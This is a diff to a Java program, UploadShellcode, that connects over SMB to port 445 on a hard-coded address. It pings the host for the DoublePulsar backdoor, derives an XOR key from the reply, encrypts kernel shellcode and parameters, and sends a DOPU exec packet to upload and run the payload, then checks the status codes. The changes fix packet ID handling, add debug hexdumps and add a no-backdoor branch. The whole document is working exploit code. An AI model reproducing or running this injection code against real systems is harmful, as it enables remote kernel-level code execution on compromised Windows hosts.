@@ -294,7 +294,7 @@ public class UploadShellcode {
          * Connection
          * ========================= */
 
-        String ip = "192.168.0.70";
+        String ip = "192.168.0.248";
         int port = 445;
         int timeoutMillis = 5000;
 
@@ -334,7 +334,7 @@ public class UploadShellcode {
         System.out.println("UserID: " + userid);
 
         //int userId = readUInt16LE(sessionSetupResponse, 32);
-        System.out.printf("User ID = %d", userid);
+        System.out.printf("User ID = %d\n", userid);
 
         /* =========================
          * Tree connect (update UID)
@@ -348,7 +348,7 @@ public class UploadShellcode {
         treeConnectRequest[userIdOffset]     = (byte) (userid & 0xFF);
         treeConnectRequest[userIdOffset + 1] = (byte) ((userid >> 8) & 0xFF);
 
-        System.out.println("Sending tree connect");
+        System.out.println("Sending tree connect request");
         out.write(treeConnectRequest);
         int treeRespLen = in.read(buffer);
         byte[] treeConnectResponse = Arrays.copyOf(buffer, treeRespLen);
@@ -361,7 +361,7 @@ public class UploadShellcode {
         System.out.println("TreeID: " + treeid);
 
         //int treeId = readUInt16LE(treeConnectResponse, 28);
-        System.out.printf("Tree ID = %d", treeid);
+        System.out.printf("Tree ID = %d\n", treeid);
 
         /* =========================
          * Trans2 session setup
@@ -369,26 +369,30 @@ public class UploadShellcode {
 
         byte[] modifiedTrans2 = Arrays.copyOf(trans2SessionSetup, trans2SessionSetup.length);
 
-        writeUInt16LE(modifiedTrans2, userIdOffset, (short)userid);
-        writeUInt16LE(modifiedTrans2, treeIdOffset, (short)treeid);
+        //writeUInt16LE(modifiedTrans2, userIdOffset, (short)userid);
+        //writeUInt16LE(modifiedTrans2, treeIdOffset, (short)treeid);
 
         // Tree ID
-        //modifiedTrans2[28] = treeConnectResponse[28];
-        //modifiedTrans2[29] = treeConnectResponse[29];
+        modifiedTrans2[28] = treeConnectResponse[28];
+        modifiedTrans2[29] = treeConnectResponse[29];
 
         // User ID
-        //modifiedTrans2[32] = sessionSetupResponse[32];
-        //modifiedTrans2[33] = sessionSetupResponse[33];
+        modifiedTrans2[32] = sessionSetupResponse[32];
+        modifiedTrans2[33] = sessionSetupResponse[33];
 
-        System.out.println("Sending trans2 session setup - ping command");
+        System.out.println("Sending trans2 session setup - ping command\n");
         out.write(modifiedTrans2);
 
-        int finalLen = in.read(buffer);
-        byte[] finalResponse = Arrays.copyOf(buffer, finalLen);
+        int trans2_response = in.read(buffer);
+        byte[] finalResponse = Arrays.copyOf(buffer, trans2_response);
 
-        if ((finalResponse[34] & 0xFF) == 81)
+        ByteBuffer trans2Response = ByteBuffer.wrap(finalResponse);
+        trans2Response.order(ByteOrder.LITTLE_ENDIAN);
+
+        hexdump(finalResponse, 16);
+
+        if ((finalResponse[34]) == 81)
         {
-
             // signature = final_response[18:22]
             byte[] signature = Arrays.copyOfRange(finalResponse, 18, 22);
             int signatureLong = ByteBuffer.wrap(signature)
@@ -417,6 +421,7 @@ public class UploadShellcode {
              * ========================= */
 
             byte[] xorBytes = byteXor(modifiedKernelBytecode, key);
+            //hexdump(xorBytes, 16);
 
             int entireShellcodeSize = modifiedKernelBytecode.length;
             //must pad the value to 4096
@@ -458,6 +463,7 @@ public class UploadShellcode {
              * ========================= */
 
             byte[] xorParameters = byteXor(parameters, key);
+            hexdump(xorParameters, 16);
 
 
             /* =========================
@@ -532,8 +538,14 @@ public class UploadShellcode {
             //dopuExecPacket[32] = userId[0];
             //dopuExecPacket[33] = userId[1];
 
-            writeUInt16LE(dopuExecPacket, userIdOffset, (short)userid);
-            writeUInt16LE(dopuExecPacket, treeIdOffset, (short)treeid);
+            dopuExecPacket[28] = treeConnectResponse[28];
+            dopuExecPacket[29] = treeConnectResponse[29];
+
+            dopuExecPacket[32] = sessionSetupResponse[32];
+            dopuExecPacket[33] = sessionSetupResponse[33];
+
+            //writeUInt16LE(dopuExecPacket, userIdOffset, (short)userid);
+            //writeUInt16LE(dopuExecPacket, treeIdOffset, (short)treeid);
 
             /* =========================
              * Append parameters + payload
@@ -566,7 +578,7 @@ public class UploadShellcode {
              * Status checks
              * ========================= */
 
-            if ((smbResponse[9] & 0xFF) == 0x02 &&
+            if ((smbResponse[9]) == 0x02 &&
                     (smbResponse[10] & 0xFF) == 0x00 &&
                     (smbResponse[11] & 0xFF) == 0x00 &&
                     (smbResponse[12] & 0xFF) == 0xC0) {
@@ -574,11 +586,11 @@ public class UploadShellcode {
                 System.out.println("DOPU returned: 0xC0000002 - STATUS_NOT_IMPLEMENTED!");
             }
 
-            if ((smbResponse[34] & 0xFF) == 82) {
+            if ((smbResponse[34]) == 82) {
                 System.out.println("DOPU returned:  Success!\n");
-            } else if ((smbResponse[34] & 0xFF) == 98) {
+            } else if ((smbResponse[34]) == 98) {
                 System.out.println("DOPU returned:  Invalid parameters!\n");
-            } else if ((smbResponse[34] & 0xFF) == 114) {
+            } else if ((smbResponse[34]) == 114) {
                 System.out.println("DOPU returned:  Allocation failure!\n");
             } else {
                 System.out.println("DOPU didn't succeed\n");
@@ -592,8 +604,11 @@ public class UploadShellcode {
                     "00000023ff534d4271000000001807c00000000000000000000000000008fffe00084100000000"
             );
 
-            writeUInt16LE(treeDisconnect, userIdOffset, (short)userid);
-            writeUInt16LE(dopuExecPacket, treeIdOffset, (short)treeid);
+            treeDisconnect[28] = treeConnectResponse[28];
+            treeDisconnect[29] = treeConnectResponse[29];
+
+            treeDisconnect[32] = sessionSetupResponse[32];
+            treeDisconnect[33] = sessionSetupResponse[33];
 
             out.write(treeDisconnect);
             in.read(smbResponse);
@@ -605,12 +620,18 @@ public class UploadShellcode {
             byte[] logoff = hexToBytes( "00000027ff534d4274000000001807c00000000000000000000000000008fffe0008410002ff0027000000"
             );
 
-            writeUInt16LE(logoff, userIdOffset, (short)userid);
-            writeUInt16LE(logoff, treeIdOffset, (short)treeid);
+            logoff [28] = treeConnectResponse[28];
+            logoff [29] = treeConnectResponse[29];
+
+            logoff [32] = sessionSetupResponse[32];
+            logoff [33] = sessionSetupResponse[33];
 
             out.write(logoff);
             in.read(smbResponse);
 
+            socket.close();
+        }  else {
+            System.out.print("No doublepulsar detected!\n");
             socket.close();
         }
     }
